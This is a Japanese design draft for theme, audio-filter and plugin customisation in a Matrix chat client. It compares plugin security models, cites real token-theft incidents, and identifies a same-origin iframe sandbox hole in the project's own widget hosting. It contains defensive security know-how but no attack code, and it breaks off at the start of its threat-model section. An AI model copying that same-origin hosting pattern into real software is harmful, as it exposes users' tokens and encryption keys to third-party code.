# ユーザーカスタム機構 (OBS 風) — 検討ドラフト

**ステータス: 検討ドラフト v0.1** (2026-07-08 起票)。運用者の決定により、対象は次の 3 本に確定している。

1. アプリ内プラグイン (BetterDiscord 風)
2. テーマ / 見た目
3. 音声 / 映像フィルタ (OBS フィルタ風)

運用者はセキュリティを最重要視しており、「検討から始める」ことを明示している。本文書は設計ドラフトを
先に固め、GPT (別 AI) のレビューに回してから要件化する土台とする。**この文書は単体で読める** —
リポジトリを見られない読者 (他 AI を含む) でも、ここから検討に参加できることを意図している。

## 0. 結論サマリ

- **OBS のカスタム性とチャットクライアントのカスタム性は、脅威モデルが本質的に違う。** OBS プラグインの
  任意コードは「配信ソフト 1 本のローカルプロセス」に閉じるが、チャットクライアントのプラグインは
  **Matrix セッションそのもの (アクセストークン・E2EE 鍵・全参加ルームの会話) に触れ得る任意コード**
  になる。OBS の緩いプラグイン文化 (署名なし・レビューなし・フルアクセス) を参照モデルにするのは
  危険で、本機構はむしろブラウザ拡張機構や Matrix widget の「宣言的権限 + サンドボックス」寄りに設計する。
- **3 本のうち「コードを実行するのはプラグインだけ」に絞れる。** テーマは CSS (トークンまたは
  スタイルシート) だけで完結でき、フィルタは「あらかじめ用意した処理ノードの並べ替え + パラメータ調整」
  で OBS フィルタ体験の大半を再現できる。**任意コード実行が必要なのはプラグインのみ**であり、
  ここにセキュリティ投資を集中する。
- **すでに使っている Matrix widget 機構 (Element Call を iframe で埋め込む仕組み) は、プラグイン基盤の
  出発点として転用できる。** widget の capability 交渉モデル (`CallWidgetDriver` 相当) は「ホストの
  Matrix セッションを直接渡さず、narrow なメソッド呼び出しだけを許可する」設計そのものであり、
  これをプラグイン API に一般化するのが最短距離。ただし **重要な注意点がある** (§3.6): 現状の EC
  widget ホスティングは実は同一オリジンで `allow-same-origin` を付与しており、真の分離境界には
  なっていない。プラグインではこの穴を塞ぐ必要がある (詳細後述)。
- **推奨: 段階導入。** テーマ (宣言的トークン) → フィルタ (宣言的パラメータ化) → プラグイン基盤 v0
  (widget capability モデル流用のサンドボックス、配布は運用者キュレーションのみ)、の順で進め、
  「BetterDiscord 型の非サンドボックス JS 注入」(選択肢 A) は**当面まったくやらない**。

---

## 1. 前提知識 (このプロジェクトを知らない読者向け)

**SelfMatrix** は Matrix プロトコル上に Discord 代替のチャット + 通話 (音声・画面配信中心、カメラなし)
体験を作る個人プロジェクト。参加者は運用者の友人サークル (~10 人規模)。

- **サーバー側**: 自宅 Synapse (Matrix ホームサーバー) + PostgreSQL。通話は MatrixRTC + LiveKit (SFU)。
- **クライアント側**: 2 つの upstream OSS の fork を組み合わせている。
  - **cinny fork** — Discord 風のシェル (サーバー/チャンネル UI、チャット、設定画面、通話コントロール)。
    React + TypeScript。テーマは `vanilla-extract` (`.css.ts`) によるビルド時 CSS。
  - **Element Call (EC) fork** — 通話画面本体。cinny のページ内に **Matrix widget** (実質 iframe)
    として埋め込まれる。
  - 2026-07-08 時点で **web 版 (ブラウザ配布) と native 版 (Electron デスクトップアプリ) を併走**する
    方針が確定している。ソースコードは 1 本 (cinny fork の `product/discord-style-shell` ブランチ)、
    分岐するのはビルド (配布物) だけ。native 固有機能はビルド時フラグでゲートし、web ビルドからは
    tree-shake で除去する(セキュリティ上の `MUST`)。
- **Matrix widget とは**: Matrix の標準拡張機構で、外部の Web アプリ (今回は EC) をルーム内に埋め込む
  仕組み。widget は iframe でサンドボックスされ、ホストとは `postMessage` 経由の JSON メッセージ
  (`matrix-widget-api` ライブラリ) でしかやり取りしない。widget が要求する権限 (「このイベント種別を
  送信したい」等) をホストが個別に承認する **capability 交渉モデル**を持つ。
- **既存のカスタム性の実態 (現状把握)**:
  - **テーマ**: `cinny/src/colors.css.ts` に `@vanilla-extract/css` の `createTheme()` で色トークンを
    定義した数種類のテーマ (Light / Silver / Dark / Butter / SelfMatrix) があり、
    `cinny/src/app/hooks/useTheme.ts` がテーマ切替のロジック、`cinny/src/app/pages/ThemeManager.tsx`
    が `document.body.classList` へ適用する。**すべてビルド時に確定する静的 CSS** で、
    ランタイムでのユーザー定義 CSS 注入や「カスタム CSS」設定は現状**存在しない** (grep 確認済み)。
  - **音声フィルタ**: ノイズ抑制 (RNNoise、Discord の Krisp 相当) が実装済み。
    `element-call/src/livekit/NoiseSuppressionProcessor.ts` が livekit-client の
    `TrackProcessor<Track.Kind.Audio>` インターフェースを実装し、音声グラフは
    `MediaStreamTrack → MediaStreamAudioSourceNode → RnnoiseWorkletNode (AudioWorklet + WASM)
    → MediaStreamAudioDestinationNode → processedTrack`。`element-call/src/livekit/AudioProcessorContext.tsx`
    が設定 (`noiseSuppressionMl`) に応じてこの processor を差し込む。**現状は「RNNoise を通すか通さないか」
    の 1 段トグルのみ**で、複数フィルタの連結や並べ替えはできない。
  - **映像処理**: `element-call/src/livekit/BlurBackgroundTransformer.ts` が
    `@livekit/track-processors` の `BackgroundTransformer` を拡張し、MediaPipe の
    `ImageSegmenter` でセグメンテーションした背景ぼかしを実装済み (要件では映像はカメラ非対応 `OUT`
    だが、画面共有の背景処理等ではなく「映像トラックに対する変換パイプライン」という**仕組み自体**は
    既にある)。
  - **プラグイン**: 相当する仕組みは**一切ない**。UI 拡張点・スクリプト実行環境ともにゼロから設計する。
- **cinny の widget ホスティングの実装詳細** (プラグイン設計の土台になるため精読済み):
  `cinny/src/app/plugins/call/CallEmbed.ts` の `getIframe()` で
  `iframe.sandbox = 'allow-forms allow-scripts allow-same-origin allow-popups allow-modals allow-downloads'`、
  `iframe.allow = 'microphone; camera; display-capture; autoplay; clipboard-write;'` を設定し、
  `ClientWidgetApi` (npm `matrix-widget-api`) 経由で `CallWidgetDriver` (`sendEvent` /
  `sendToDevice` / `readRoomState` / `askOpenID` 等、`mx: MatrixClient` を直接持つが widget 側には
  一切公開しない) とブリッジしている。widget の URL は `new URL(..., window.location.origin)` で
  組み立てられており (同ファイル 130 行目付近)、**cinny 本体と EC widget は同一オリジン**で配信される
  (`vite.config.js` の `viteStaticCopy` が EC ビルド成果物を cinny の `public/element-call/` へ
  コピーする)。この「同一オリジン + `allow-same-origin`」の組み合わせが持つ意味は §3.6 で詳述する。

---

## 2. 動機と参照モデル

### 2.1 OBS のカスタム性の分解

OBS Studio のカスタム性は大きく 5 系統に分けられる。

| OBS の機構 | 内容 | 実行される場所 | 権限モデル |
| --- | --- | --- | --- |
| ネイティブプラグイン | C++ の共有ライブラリ (`.dll`/`.so`)。OBS の内部 API をフル利用 | OBS 本体プロセス内、事実上フル権限 | なし (署名任意、レビューなし) |
| スクリプト (Lua/Python) | OBS の Scripting API を叩くスクリプト | OBS 本体プロセス内 (組込みインタプリタ) | なし。ただしネイティブより到達範囲は Scripting API に限定される |
| テーマ | Qt スタイルシート (`.qss`) + アイコンリソース | 表示のみ、コード実行なし | なし (見た目だけなので実質リスクゼロ) |
| フィルタ | 音声/映像ソースに挿せるエフェクトチェーン (ノイズ抑制・クロマキー・色調整等)。大半は組込み。カスタムは実質シェーダー (`.effect`) 止まり | GPU シェーダー実行、DOM/ファイルシステムには触れない | なし。ただし到達範囲が非常に狭い (フレームバッファ変換のみ) |
| websocket (obs-websocket) | 外部プロセスから OBS をリモート制御する API | OBS 外の別プロセス。ローカル TCP + トークン認証 | トークンベース。相手は「別プロセス」であり OBS の内部状態を直接は触れない |

### 2.2 SelfMatrix への翻訳と、決定的な脅威モデルの違い

| OBS | SelfMatrix 対応 | 脅威モデルの違い |
| --- | --- | --- |
| テーマ (.qss) | ②テーマ/見た目 | ほぼ同型。コード実行なしなら OBS 同様リスクは低い |
| フィルタ | ③音声/映像フィルタ | OBS フィルタは「フレームバッファの変換」に閉じるが、ブラウザの音声/映像パイプラインは AudioWorklet/WebGL 経由でも**設計次第では**より広い到達範囲を持ちうる (後述、§5.2 で境界を明示) |
| ネイティブプラグイン/スクリプト | ①アプリ内プラグイン | **ここが本質的に違う**。OBS のプラグインが盗めるのはせいぜい「配信設定・キャプチャ画面」だが、SelfMatrix のプラグインが実行時に到達し得るのは: Matrix アクセストークン、E2EE デバイス鍵・ルーム鍵 (=全 E2EE ルームの過去ログを復号できる鍵)、開いている全ルームのタイムライン、連絡先一覧、そして (通話埋め込みと同じ仕組みを使うなら) 通話の音声/映像トラックそのもの |
| websocket | (将来候補、本ドラフト対象外) | 外部ミュート制御 (Stream Deck 連携等) は requirements.md §9 で SHOULD 済みだが、プラグイン機構とは別系統として `native-milestones.md` 側で検討中。本文書では扱わない |

**結論**: OBS はカスタム性の実現方式として「フルアクセス・レビューなし」を許容できている。なぜなら
盗まれて困るものが OBS のプロセス内にほぼ無い (配信キーくらい) から。SelfMatrix はそうではない —
**「チャットクライアントの任意コード実行」は「アカウント全体の乗っ取り + 全会話の窃取」と事実上同義**
になり得る。したがって参照モデルは OBS ではなく、次章の「任意コード実行を扱ってきた他ソフトウェア」
に求める。

---

## 3. 先行事例の教訓 (Web 調査、一次ソース優先)

同種の「任意コード拡張を許すソフトウェア」を 6 系統調査した。表はサマリ、詳細は各節。

| 系統 | サンドボックス | 権限宣言 | レビュー/キュレーション | 既知の実被害 |
| --- | --- | --- | --- | --- |
| BetterDiscord | **なし** (Discord Electron クライアントに完全同居) | なし | 公式掲載時のみのガイドライン審査 (技術的強制なし) | あり (§3.1) |
| Vencord | **なし** (BD と同型) | なし | **内蔵プラグインは PR レビュー必須**、`userplugins/` は完全未レビュー | 公式配布ドメインの偽サイト事案 (§3.2) |
| Obsidian コミュニティプラグイン | **なし** (Node.js/Electron フルアクセス、公式に明言) | 2026-05 以降ダッシュボードで宣言制導入中 (発展途上) | 初回提出時のみ + 自動スキャン (2026-05〜) | CVE あり、正規プラグイン悪用事案あり (§3.3) |
| VS Code Extension Host | **なし** (公式に「VS Code 自体と同じ権限」と明言) | なし (Marketplace 側でマルウェアスキャン) | 公開時スキャン + 発行者検証プロンプト | Marketplace 上の悪意拡張の継続的な摘発報道 (未確認一次情報) |
| ブラウザ拡張 (Manifest V3) | **あり** (isolated world、content script と background の分離) | **あり** (`permissions`/`host_permissions`/`activeTab`) | ストア審査 + 実行時警告 | (今回対象外、他社比較として引用) |
| Matrix widget | **あり** (仕様上は iframe sandbox + capability 交渉、生トークン非公開) | **あり** (capability 文字列を個別承認) | ホスト実装依存 | 該当なし (widget 自体は自前実装なのでレビュー概念が別) |

### 3.1 BetterDiscord

Discord Electron クライアントの `discord_desktop_core/index.js` を差し替えて自身の JS を先に
`require` させるインストーラで動作する。BetterDiscord 自身の issue で、注入時に
`nodeIntegration=true` / `enableRemoteModule=true` / `contextIsolation=false` にして CSP も外す
ことが確認されている ([BetterDiscord/BetterDiscord#442](https://github.com/BetterDiscord/BetterDiscord/issues/442))。
プラグインには `fs`/`path`/`electron`/`vm` 等を晒す `require()` ポリフィルがある
([API docs](https://docs.betterdiscord.app/api/))。つまり **プラグインは認証済みクライアントと
完全に同じ JS コンテキストで動く** — DOM、`localStorage` (=トークン)、IPC、Node.js すべて到達可能。

[公式ガイドライン](https://docs.betterdiscord.app/plugins/publishing/guidelines) はトークン/
メール/パスワードへのアクセスや `child_process` 濫用を「公式掲載」の条件として禁止しているが、
これは**掲載時のポリシー**であって、掲載外の `.plugin.js` を読み込むこと自体を技術的に阻む仕組みは
何もない。実際、BetterDiscord 公式アカウント自身が
「[トークン漏洩は公式サイトに無い悪意プラグインから起きている。直近の実被害は Powercord という
別クライアント mod 用の悪意プラグインだった](https://x.com/_BetterDiscord_/status/1637147359967674372)」
と述べており、**「非公式プラグイン経由のトークン窃取」が繰り返し起きるカテゴリであることを運営自身が
認めている**。マルウェア (Skuld/TMPN 系インフォスティーラー) が `%AppData%\Roaming\BetterDiscord\
data\betterdiscord.asar` を名指しで書き換えてクライアントコードを乗っ取る手口も観測されている
([Trellix](https://www.trellix.com/blogs/research/skuld-the-infostealer-that-speaks-golang/))。

### 3.2 Vencord

BetterDiscord の実質後継。同じくインストーラが `app.asar` を差し替え (`sandbox=false` を明示設定)、
Discord の webpack モジュールをパッチする方式で、**信頼境界は BetterDiscord と同じく「なし」**。

違いは掲載モデル: `src/plugins/` (Discord 本体にバンドルされる内蔵プラグイン) は
[CONTRIBUTING.md](https://github.com/Vendicated/Vencord/blob/main/CONTRIBUTING.md) の基準で
PR レビュー必須 (self-bot 禁止・危険 API の濫用禁止等) だが、`src/userplugins/` は
git-ignore 対象の**完全未レビュー領域**として明確に分離されている
([docs.vencord.dev/plugins](https://docs.vencord.dev/plugins/))。公式 FAQ も
「内蔵プラグインは安全」と**スコープを限定して**主張している ([vencord.dev/faq](https://vencord.dev/faq/))。
これは「キュレーションされたコアと、自己責任の野良領域を明確に分ける」という、BetterDiscord には
無かった構造上の改善であり、本機構の設計 (§6) でも踏襲したい。既知の実被害は主に
偽サイト (`vencord.app` 等の非公式ドメイン) を経由したインストーラ乗っ取りで、
[Vencord 自身が公式サイトは `vencord.dev` のみと明記して警告](https://github.com/Vendicated/Vencord/issues/2085)
している。

### 3.3 Obsidian コミュニティプラグイン

公式ドキュメントが明言する通り「技術的な制約により、プラグインを特定の権限やアクセスレベルに
確実に制限することはできない」— ローカルファイル読み書き・任意の外部通信・追加プログラムの起動が
可能 ([obsidian.md/help/plugin-security](https://obsidian.md/help/plugin-security))。
既定で「制限モード (Restricted Mode)」が ON になっており、これがオフになるまでサードパーティコードは
実行されない。レビューは歴史的には**初回提出時の PR レビューのみ**だったが、
[2026-05-12 の公式ブログ](https://obsidian.md/blog/future-of-plugins/) によれば、
**バージョンごとの自動スキャン (脆弱性/マルウェア) + 公開の安全性スコア**へ移行しつつあり、
人手レビューは注目/フラグ付きプラグインに絞る方向。権限宣言 (ネットワーク/ファイルシステム/
クリップボードアクセスの宣言) や「検証済み作者」バッジも発表されているが、時点では完全稼働ではない
(発展途上と明記)。

「レビュー済み ≠ 安全」の実例が 2 つある。**CVE-2021-42057**: 人気プラグイン Dataview の
`evalInContext` が安全でない `eval` を使っており、細工したファイルで任意コード実行が可能だった
(レビュー通過後に外部研究者が発見)。**「Phantom in the Vault」/PHANTOMPULSE
([Elastic Security Labs, 2026-04](https://www.elastic.co/security-labs/phantom-in-the-vault))**:
攻撃者が標的にボールト共有を社会工学で持ちかけ、制限モードを手動解除させた上で**正規のストア掲載
プラグイン** (Shell Commands = OS コマンド自動実行、Hider = UI 隠蔽) を悪用して RAT を仕込んだ事案。
これは「悪意プラグインが審査を突破した」のではなく、**正規機能 + ユーザーによる安全機構の意図的解除**
の組み合わせで起きた点が重要な教訓 — 本機構でも「危険な機能を持つプラグイン自体」と
「その機能を有効化させる社会工学」を分けて対策する必要がある。

### 3.4 VS Code Extension Host

公式ドキュメントが明言: 「Extension Host は VS Code 自体と同じ権限を持つ… 拡張機能はマシン上の
ファイルの読み書き、ネットワークリクエスト、外部プロセスの実行、ワークスペース設定の変更ができる」
([extension-runtime-security](https://code.visualstudio.com/docs/configure/extensions/extension-runtime-security))。
別プロセスに分離されているのは**安定性 (拡張のクラッシュが本体に波及しない)** のためであり、
セキュリティサンドボックスではないと明記されている
([extension-host docs](https://code.visualstudio.com/api/advanced-topics/extension-host))。

「Workspace Trust / Restricted Mode」は AI エージェント・ターミナル・タスク・デバッグ等を制限するが、
[公式ドキュメント自身が](https://code.visualstudio.com/docs/editing/workspaces/workspace-trust)
「Workspace Trust は悪意ある拡張機能がコードを実行し Restricted Mode を無視することを防げない。
信頼できる既知の発行者の拡張機能のみをインストールすべき」と明言しており、**「ワークスペース側から
渡されるコード」への防御であって「拡張機能自体」への防御ではない**、という重要なスコープの違いがある。

一方、vscode.dev の Web 拡張は**ブラウザの Web Worker 内で実行**され、Node グローバル
(`process`/`os`/`fs`) なし、`require` なし、子プロセス起動なし、ファイルシステムは仮想化 API
(`vscode.workspace.fs`) 経由のみ、ネットワークは `fetch` (CORS 制約あり) のみ
([web-extensions ガイド](https://code.visualstudio.com/api/extension-guides/web-extensions))。
**同じ「拡張機能」という概念でも、ホスト環境 (デスクトップ vs ブラウザ) によって信頼境界が全く違う**
という好例であり、本機構の web/native 差 (§6.5) を考える上で参考になる。

### 3.5 ブラウザ拡張機構 (Manifest V3)

公式 Chrome ドキュメントから確認できる、本機構が最も参考にすべきモデル。

- **宣言的権限**: `permissions` (固定文字列の能力) と `host_permissions` (オリジンパターン) を
  マニフェストで宣言し、インストール時にレビュー・警告表示される
  ([Declare permissions](https://developer.chrome.com/docs/extensions/develop/concepts/declare-permissions))。
- **`activeTab`**: ユーザー操作 (アイコンクリック等) をトリガーに、現在のタブだけへ一時的にアクセスを
  与え、ナビゲーションで失効する。永続的な `<all_urls>` を避けるための設計
  ([activeTab docs](https://developer.chrome.com/docs/extensions/develop/concepts/activeTab))。
- **isolated world**: content script はページと DOM を共有するが JS のグローバルスコープは共有しない
  (「ページからも他の拡張からも見えないプライベートな実行環境」 —
  [Content scripts docs](https://developer.chrome.com/docs/extensions/mv3/content_scripts/))。
- content script ↔ background service worker 間は `chrome.runtime.sendMessage`
  経由のメッセージパッシングのみで、共有メモリや直接の関数呼び出しはない。

**要点**: これは「非サンドボックス型 (BD/Vencord/Obsidian)」の正反対で、**能力は事前に全列挙され
レビュー可能、実行コンテキストは既定で分離、越境通信はメッセージのみ**という構造。本機構の
プラグイン API 設計 (§5.3) はこの型に寄せる。

### 3.6 Matrix widget (capability 交渉 + サンドボックス) — そして自己コード精読で見つかった重要な注意点

Matrix の widget 仕様 (widget 化提案 MSC2764 とその中の capability 定義 MSC2762、
`matrix-widget-api` 実装) は次を明言している。

- widget は起動時/交渉時に必要な capability (`m.send.event:m.room.message` 等) を宣言し、
  ホストが個別承認する。ホストは**未知の capability を自動承認してはならない**
  ([MSC2764 草稿](https://github.com/matrix-org/matrix-spec-proposals/blob/b910b8966524febe7ffe78f723127a5037defe64/specification/widgets.rst))。
- 「widget は iframe 等でレンダリングし、**widget がクライアントの保存データ (アクセストークンや
  暗号鍵) に到達できないよう** sandbox を適用すべき」と明記。widget に生のアクセストークンは渡さず、
  必要なら `get_openid` → ユーザー承認 → ホームサーバーが発行するスコープ付き OpenID トークン
  (widget 用の別トークン) を使う。
- ただし widget 仕様自体は 2026-07-08 時点でも**正式な Matrix spec に未マージ** (`matrix-widget-api`
  の README にも「widget はまだ spec に入っていない」と明記) であり、細かい `sandbox` 属性値
  (どのフラグを立てるか) は仕様レベルでは規定されておらず各クライアント実装依存。

**ここで cinny の実コードを精読して見つけた重要な事実**: cinny の EC widget ホスティング
(`cinny/src/app/plugins/call/CallEmbed.ts`) は、
`sandbox="allow-forms allow-scripts **allow-same-origin** allow-popups allow-modals allow-downloads"`
かつ widget URL を `window.location.origin` から組み立てている (= **cinny 本体と同一オリジン**)。
`allow-same-origin` は「iframe の内容を実際のオリジンとして扱う (cookie/localStorage 等をその
オリジンのものとして使わせる)」フラグであり、これと「実際に同一オリジン」が組み合わさると、
ブラウザの同一オリジンポリシー上、**iframe 側の JS は `window.parent` 経由でホストの DOM/JS
グローバルへ同期的に到達できる** (postMessage を介さずに)。

これは **現状の EC 埋め込みでは実害にならない** — EC は自分たちがビルドする一次ソースコードであり、
信頼できる。しかし、**この「同一オリジン + `allow-same-origin` のパターン」をそのままプラグイン
ホスティングに流用すると、サードパーティ製プラグインに対しては全くサンドボックスにならない**。
実際、native 版の設計文書 (`native-widget-transport.md`) 側でも独立に同種のリスクが指摘されている
(「同一オリジン子フレームから main world API への到達」— M1 レビューの残存リスク項目) — つまり
**このコードベースには「同一オリジンの落とし穴」に繰り返しハマりやすい構造がある**ことが、
web 版・native 版の両方の精読から確認できた。プラグインのサンドボックス設計 (§5.3, §6) では
**この穴を踏襲しないことを明示的な設計原則にする**必要がある: `allow-same-origin` を落とすか、
真に別オリジン (別ポート/別サブドメイン、または native では別 origin scheme) でホストする。

---

## 4. アーキテクチャ選択肢

| 案 | 内容 | セキュリティ | 自由度 | 工数 | web/native 併走との相性 |
| --- | --- | --- | --- | --- | --- |
| **A. 非サンドボックス JS 注入** (BetterDiscord/Vencord 型) | クライアント本体の JS コンテキストにプラグインコードをそのまま実行させる | **最低** — トークン・E2EE 鍵・全会話に無条件到達。§3.1/3.2 の実被害と同型のリスクをそのまま抱える | **最大** — 何でもできる (UI 改造・内部 API フック等) | 小 (仕組みは単純) | web で提供すると「公開ログイン面 + 任意コード実行」が重なり web-native-parallel.md の懸念 (公開面の最小化) と正面衝突。native でも運用者の脅威モデル最重要視と矛盾 |
| **B. サンドボックス実行** (iframe/Worker + capability API。widget 機構の流用含む) | プラグインは隔離された実行コンテキストで動き、ホストとは narrow なメソッド呼び出し (capability で宣言・承認された分だけ) でしかやり取りしない。§3.6 の穴を踏まえ真に別オリジンでホストする | **高** — 到達範囲を API 面で構造的に絞れる。ただし実装ミス (§3.6 型の穴) には注意が要る | 中 — UI 拡張・スラッシュコマンド・タイムライン読み取り等、宣言した capability の範囲で可能 | 中 — `CallWidgetDriver` 相当の資産を再利用できるため 0 からではない | 実行サンドボックス自体は web でも native でも同じ仕組みで動く (widget 機構は元々 web 技術)。**R1 (既定は共通コード) に合致** |
| **C. 宣言的カスタムのみ** (コード実行なし。テーマ=CSS 変数/カスタム CSS、フィルタ=事前定義チェーンの並べ替え+パラメータ) | ユーザーは「値」や「順序」だけを与え、実行されるロジックはすべて開発者が書いたもの | **最高** (コード実行がないため、この経路からのトークン窃取は原理的に不可能) | 低〜中 — 見た目とフィルタ効果の範囲では OBS 体験にかなり近づけるが、「独自ロジックを書く」自由度はない | 小 | 完全に web/native 共通。むしろ native 固有にする理由がない |
| A+B+C の段組み | 層ごとに異なる案を採用 | — | — | — | — |

### 推奨: 層ごとの組み合わせ

- **テーマ = C** (コード実行なしで十分に OBS のテーマ相当の体験になる。§5.1)
- **フィルタ = C から始め、必要なら将来 B へ拡張** (built-in フィルタの並べ替え+パラメータ化で
  当面の要求は満たせる。ユーザー独自のフィルタ*コード*を書きたくなった時だけ、AudioWorklet の
  隔離された実行コンテキストという既に強いサンドボックス特性を使って B へ広げる。§5.2)
- **プラグイン = B から始める。A は当面やらない** (むしろ将来的にもやらない想定を基本線とし、
  必要になったとしても要件を精査した上で改めて検討する。§5.3, §7)

---

## 5. 3 本それぞれの具体設計スケッチ

### 5.1 テーマ

**現状**: `cinny/src/colors.css.ts` の `createTheme()` によるビルド時 CSS テーマ 5 種
(Light/Silver/Dark/Butter/SelfMatrix)。`cinny/src/app/hooks/useTheme.ts` が選択ロジック
(システム連動 or 手動選択、ライト/ダーク別に選べる)、`cinny/src/app/pages/ThemeManager.tsx` が
`document.body.classList` へ適用。**ランタイムのユーザー定義は不可**。

**開放案 (2 段階)**:

1. **宣言的トークンテーマ (推奨、先行実装)**: 色トークン (folds の `color` オブジェクトが持つ
   `Background.Container` 等のキー) を JSON で受け取り、ランタイムで
   `document.documentElement.style.setProperty('--color-xxx', value)` のように CSS カスタム
   プロパティへ反映する。**値は色コード (または既知の限られた型) のみ**を許容し、任意 CSS 文法は
   一切受け付けない。既存の `chroma-js` ベースの `accessibleColor()` (`cinny/src/app/plugins/color.ts`)
   でコントラスト検査を通してから適用すれば、「読めない配色を配ってしまう」事故も防げる。
   - 配布形式: JSON ファイル 1 つ。友人間で気軽に共有できる (Discord のテーマ共有文化と同じ体験)。
   - web でも native でも**そのまま使える** (CSS 変数の話でしかないため native 固有の理由がない →
     web-native-parallel.md の R1 に合致、共通コードで実装)。
2. **生カスタム CSS (Discord/BetterDiscord 型、SHOULD/LATER)**: 任意の CSS テキストを注入できる
   機能。コード実行はできないが、CSS だけでも次の残存リスクがある。
   - `url()` 経由の外部リソース読み込みによる**閲覧トラッキング/IP 漏洩** (画像・フォントの
     リクエスト先が閲覧の事実を外部に知らせる)。
   - `:has()` やレイアウト操作による**UI の視覚的な偽装** (例: 「これは公式の警告です」と見せかける
     オーバーレイ、ボタンの意味を入れ替える等の「見た目のクリックジャッキング」)。コード実行より
     被害は軽いが、フィッシング的ななりすましは CSS だけでも一定できる。
   - 対策候補: `url()` を同一オリジン相対パスのみに制限する CSS サニタイザを通す、
     `@import` を禁止する、適用前に「知らない人から受け取ったカスタムテーマは見た目を偽装できる」
     という明示的な警告を出す。
   - 段階導入の 2 番目 (1 のトークン形式で足りない「細かい見た目の作り込み」需要が出てから) として
     位置づけ、v1 では見送ってよい。

### 5.2 音声フィルタ (OBS フィルタ相当)

**現状の挿入点**: `element-call/src/livekit/NoiseSuppressionProcessor.ts` が livekit-client の
`TrackProcessor<Track.Kind.Audio, AudioProcessorOptions>` を実装し、
`element-call/src/livekit/AudioProcessorContext.tsx` が設定に応じてこの 1 つの processor を
`LocalAudioTrack.setProcessor()` (または `audioCaptureDefaults.processor`、
`element-call/src/state/CallViewModel/remoteMembers/ConnectionFactory.ts` 参照) に渡している。
音声グラフは `MediaStreamAudioSourceNode → RnnoiseWorkletNode → MediaStreamAudioDestinationNode`
という単純な直列 1 段。

**設計案 (宣言的フィルタチェーン、選択肢 C)**:

- `TrackProcessor` を「複数の `AudioNode` を順に繋ぐチェーン」を保持する 1 つの合成 processor
  に一般化する (現在の `NoiseSuppressionProcessor` はチェーンの 1 ノードになる)。
- ユーザーが操作できるのは **(a) 有効化するビルトインフィルタの取捨選択、(b) 並び順、
  (c) 各フィルタの数値パラメータ** (例: ノイズゲートのしきい値、コンプレッサーのレシオ、
  EQ のバンドゲイン) のみ。**任意コードは書かせない** — ここは OBS のフィルタ UI
  (「フィルタを追加 → 上下に並べ替え → スライダーで調整」) をほぼそのまま真似られる部分。
- ビルトインフィルタの候補: RNNoise (既存)、ノイズゲート、コンプレッサー、簡易 EQ、ゲイン。
  いずれも Web Audio API の標準ノード (`DynamicsCompressorNode`/`BiquadFilterNode`/`GainNode`)
  で実装でき、新規の実行環境は不要。
- **将来、ユーザー独自のフィルタ*コード*を書きたい要求が出た場合 (選択肢 B への拡張)**:
  `AudioWorkletProcessor` は仕様上 `AudioWorkletGlobalScope` という**専用のグローバルスコープ**で
  動作し、既定で `window`/`document`/`localStorage`/`fetch` に到達しない (DOM もクレデンシャルストア
  もそのスコープには存在しない)。つまり**「ユーザーが書いた音声処理コードを実行させる」という
  一見危険な機能が、Web Audio API の仕様上すでにかなり強い実行時分離を持っている**。
  これはこの機構にとって都合の良い性質で、フィルタだけは他の 2 本 (テーマ/プラグイン) より
  低コストで「本当のユーザーコード実行」まで踏み込める余地がある。ただし CPU 独占によるサービス
  拒否 (通話品質の劣化) やタイミング解析等の副チャネルはゼロではないため、v1 は宣言的パラメータ化に
  留め、コード実行版は LATER として明示するに留める。

**映像フィルタについて (要件上カメラは対象外、実現性のみ言及)**: 映像トラックへの変換パイプライン
自体は `element-call/src/livekit/BlurBackgroundTransformer.ts` (LiveKit `BackgroundTransformer`
+ MediaPipe セグメンテーション) で既に実証されている。将来 insertable streams
(`MediaStreamTrackProcessor`/`MediaStreamTrackGenerator` を Worker に渡してフレーム単位で変換する
API) を使えば、画面共有等の映像トラックにも同様のフィルタチェーンを Worker 内で完結させることは
技術的には可能。ただし Worker 内であっても WebGL/WebGPU 経由のシェーダーコード実行は
GPU リソース枯渇や副チャネルのリスクがゼロではなく、要件上カメラが `OUT` であることも合わせ、
本ドラフトでは「実現性のみ記録し、設計は行わない」に留める。

### 5.3 アプリ内プラグイン

**方針**: §3.6 で確認した widget capability モデルを一般化する。EC を widget として動かす際に
使っている `CallWidgetDriver` (`mx: MatrixClient` を直接保持するが widget 側には公開せず、
`sendEvent`/`sendToDevice`/`readRoomState` 等の narrow なメソッドだけを widget からの
capability 承認済みリクエストに応じて呼ぶ) と同じ設計パターンで `PluginDriver` を作る。

**API 面の最小セット案** (すべて capability 宣言必須、既定は最小):

| capability | 内容 | 既定 |
| --- | --- | --- |
| `ui.slash-command` | スラッシュコマンドを 1 つ登録する | 個別承認 |
| `ui.context-menu-item` | メッセージ右クリックメニューに項目を追加する | 個別承認 |
| `ui.settings-tab` | 設定画面にタブを 1 つ追加する | 個別承認 |
| `room.read-timeline:<roomId>` | 指定ルームのタイムラインを読み取る (widget の `m.receive.event` 相当、ルーム単位のスコープ) | 個別承認、既定は「現在のルームのみ」 |
| `room.send-message:<roomId>` | 指定ルームへメッセージ送信 (widget の `m.send.event` 相当) | 個別承認 |
| `notify.show` | OS 通知/アプリ内通知を出す | 個別承認 |
| (明示的に**含めない**) | アクセストークン・E2EE 鍵・他ルームへの無制限アクセス・任意の外部ネットワーク送信 | **常に不可** — プラグイン API のどの capability からも到達できない設計にする (§6) |

**実行環境**: サンドボックス化された iframe (§3.6 の教訓を踏まえ、cinny 本体とは**別オリジン**
でホストする — 同一オリジン + `allow-same-origin` の組み合わせは使わない) または DOM を必要としない
プラグインは Worker。ホストとのやり取りは `matrix-widget-api` 風の postMessage ベース RPC
(既存の `ClientWidgetApi`/`WidgetDriver` の型をほぼ転用できる見込み)。

**インストール UX**: プラグインのマニフェスト (`plugin.json` 的なもの) が要求 capability を宣言し、
インストール時に一覧表示して明示同意を取る (ブラウザ拡張のインストール時権限表示と同型)。
バージョンアップで capability が増える場合は再同意を要求する。「セーフモード」(Obsidian の
制限モードと同じ発想) として全プラグインを一括無効化するトグルを既定 UI から常に到達可能にし、
個別プラグインの無効化 (アンインストールせずに一時停止) もサポートする。

**配布**: v1 は「運用者がキュレーションしたプラグイン一式をアプリに同梱/署名配布する」に限定し、
BetterDiscord/Obsidian のような「誰でも投稿できる公開マーケットプレイス」は当面作らない
(§6, §7)。これにより Vencord の `userplugins/`(未レビュー領域) 的なリスクを v1 では丸ごと
避けられる。

---

## 6. セキュリティ要件 (運用者の最重要関心)

### 6.1 脅威モデル

1. **悪意のあるプラグイン作者** — 最初から悪意を持って作る、または善意で作ったものが乗っ取られる
   (BetterDiscord/Vencord の実例、§3.1/3.2)。
